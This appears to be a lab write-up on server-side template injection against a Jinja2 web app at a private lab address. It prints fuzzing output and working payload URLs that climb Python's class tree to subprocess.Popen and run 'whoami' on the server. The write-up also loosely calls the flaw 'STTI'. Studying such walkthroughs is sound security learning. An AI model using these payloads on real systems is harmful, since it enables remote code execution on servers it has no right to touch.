# IP
10.10.55.183 


## Introduction
### Server Side Template(STT)
- These are templates used for automating a code, so that it can be used in many conditions.
- In this condition, it is used to welcome a user, by including name of the user in the url.
- Code injection in STT is called STTI

## Detection
- There are many ways of detecting a STT, but we will be using the manual method.
- In this example the STT is at endpoint `\profile\`
- These `${{<%[%'"}}%` characters are used in a few template engines.
- So made a python string to regex the combinations and try to request the server.

```console
❯ python3 fuzzer.py  http://10.10.55.183:5000/profile/
This is breaking the system:	http://10.10.55.183:5000/profile/${{
This is breaking the system:	http://10.10.55.183:5000/profile/${{<
This is breaking the system:	http://10.10.55.183:5000/profile/${{<%
This is breaking the system:	http://10.10.55.183:5000/profile/${{<%[
This is breaking the system:	http://10.10.55.183:5000/profile/${{<%[%
This is breaking the system:	http://10.10.55.183:5000/profile/${{<%[%'
This is breaking the system:	http://10.10.55.183:5000/profile/${{<%[%'"
This is breaking the system:	http://10.10.55.183:5000/profile/${{<%[%'"}
This is breaking the system:	http://10.10.55.183:5000/profile/${{<%[%'"}}
This is breaking the system:	http://10.10.55.183:5000/profile/{{
This is breaking the system:	http://10.10.55.183:5000/profile/{{<
This is breaking the system:	http://10.10.55.183:5000/profile/{{<%
This is breaking the system:	http://10.10.55.183:5000/profile/{{<%[
This is breaking the system:	http://10.10.55.183:5000/profile/{{<%[%
This is breaking the system:	http://10.10.55.183:5000/profile/{{<%[%'
This is breaking the system:	http://10.10.55.183:5000/profile/{{<%[%'"
This is breaking the system:	http://10.10.55.183:5000/profile/{{<%[%'"}
This is breaking the system:	http://10.10.55.183:5000/profile/{{<%[%'"}}
```
- As we can see that `{{` can break the page as a combination of braces.
- Now these braces are used in few template engines in their codes.

## Identification
- By using `template enumeration.png`, enumerated the website and found code engine to be Jinja2. 
- Now tried to found the class for code injection.
- Python allows us to call the current class instance with .__class__, we can call this on an empty string:

> Payload: `http://10.10.55.183:5000/profile/{{ ''.__class__ }}`.

- Classes in Python have an attribute called .__mro__ that allows us to climb up the inherited object tree:

> Payload: `http://10.10.55.183:5000/profile/{{ ''.__class__.__mro__ }}`

- Since we want the root object, we can access the second property (first index):

> Payload: `http://10.10.55.183:5000/profile/{{ ''.__class__.__mro__[1] }}`.

- Objects in Python have a method called .__subclassess__ that allows us to climb down the object tree:

> Payload: `http://10.10.55.183:5000/profile/{{ ''.__class__.__mro__[1].__subclasses__() }}`.

- Made an index searching script to search for index with subprocess class to execute python code.
- Found the index to be 401

```console
❯ python3 indexSearch.py data.txt " <class 'subprocess.Popen'>"

Index:	401

```

## Exploiation
- Made this payload `http://10.10.55.183:5000/profile/{{ ''.__class__.__mro__[1].__subclasses__()[401]("whoami", shell=True, stdout=-1).communicate() }}`
- Got this output.

```console
❯ python3
Python 3.10.5 (main, Jun  8 2022, 09:26:22) [GCC 11.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import requests
>>> req = requests.get("http://10.10.55.183:5000/profile/{{ ''.__class__.__mro__[1].__subclasses__()[401](\"whoami\", shell=True,     stdout=-1).communicate() }}")
>>> req.text
'<h1>Welcome to the profile of (b&#39;jake\\n&#39;, None)!</h1>'
>>>

```
User on the system is **Jake**
